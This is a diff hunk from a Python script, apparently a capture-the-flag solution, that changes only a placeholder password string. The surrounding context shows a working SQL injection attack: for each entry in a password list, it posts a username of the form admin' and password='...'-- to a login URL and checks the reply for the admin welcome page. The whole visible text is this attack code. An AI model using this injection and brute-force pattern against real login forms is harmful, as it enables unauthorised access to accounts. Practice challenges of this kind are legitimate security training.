@@ -119,7 +119,7 @@ print("### Start to attack ###")
 for password in listPassword:
     data = {
         'username':"admin' and password='"+ password + "'--",
-        'password': 'wedontneedthis'
+        'password': 'asdasdasdasds'
     }
     http = requests.post(url = URL, data = data)
     if http.text.find('Welcome back admin !</h2><h3>Your informations :</h3><p>- username : admin</p><br />Hi master ! <b>To validate the challeng')!=-1:
